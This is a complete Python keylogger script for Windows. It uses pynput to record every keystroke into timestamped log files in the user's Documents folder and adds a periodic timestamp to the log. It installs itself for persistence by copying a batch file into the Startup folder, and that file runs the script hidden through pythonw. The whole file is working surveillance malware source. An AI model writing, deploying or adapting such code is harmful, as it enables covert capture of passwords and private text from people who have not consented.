import os
import threading
from pynput.keyboard import Listener, Key, KeyCode
from datetime import datetime
import time
import shutil

log_folder = os.path.join(os.path.expanduser("~"), "Documents", "KeyLogs")
os.makedirs(log_folder, exist_ok=True)

now = datetime.now().strftime("%d-%m-%Y-%H.%M.%S")
filename = os.path.join(log_folder, 'keys_' + now + '.txt')
Last_listen_filename = os.path.join(log_folder, 'Last_listen.txt')
Current_listening_name = os.path.join(log_folder, 'listening.txt')
Current_listening = []

def Show_listening():
    if os.path.exists(Last_listen_filename):
        with open(Last_listen_filename, "r", encoding='utf-8'):
            os.startfile(Last_listen_filename)
    else:
        with open(Current_listening_name, "r", encoding='utf-8'):
            os.startfile(Current_listening_name)

def timestemp_everyminute():
    while True:
        timestemp = datetime.now().strftime("%d/%m/%Y-%H:%M:%S")
        with open(filename, "a", encoding='utf-8') as file:
            file.write(f'\n~{timestemp}:~\n')
        time.sleep(60)

def on_press(key):
    try:
        text_key = key.char
    except:
        text_key = f' [{key}]'

    with open(filename, "a", encoding='utf-8') as file:
        file.write(text_key)
        file.flush()

    with open(Current_listening_name, "a", encoding='utf-8') as showfile:
        showfile.write(text_key)
        showfile.flush()

    try:
        vk_key = getattr(key, 'vk', None)
        if vk_key is not None:
            Current_listening.append(vk_key)
            Current_listening[:] = Current_listening[-4:]
            if Current_listening == [83, 72, 79, 87]:  # S, H, O, W
                Show_listening()
    except:
        pass

    if key == Key.esc:
        return False

def start_Thread_timestemp():
    Thread_timestamp_in_file = threading.Thread(target=timestemp_everyminute, daemon=True)
    Thread_timestamp_in_file.start()

def start_listening():
    with Listener(on_press=on_press) as listener:
        listener.join()

def file_organization():
    if os.path.exists(Last_listen_filename):
        os.remove(Last_listen_filename)

    if os.path.exists(Current_listening_name):
        os.rename(Current_listening_name, Last_listen_filename)

def add_to_startup():
    bat_path = os.path.join(log_folder, "run_keylogger.bat")
    pythonw_path = os.path.abspath(r"C:\Users\USER\PycharmProjects\PythonProject\Myprojects\.venv\Scripts\pythonw.exe")
    script_path = os.path.abspath(r"C:\Users\USER\Documents\keylogger.py")

    with open(bat_path, "w") as bat_file:
        bat_file.write(f'start "" "{pythonw_path}" "{script_path}"\n')

    startup_folder = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")

    target_path = os.path.join(startup_folder, "run_keylogger.bat")

    if not os.path.exists(target_path):
        shutil.copy(bat_path, target_path)

def main():
    add_to_startup()
    file_organization()
    start_Thread_timestemp()
    start_listening()

if __name__ == '__main__':
    main()
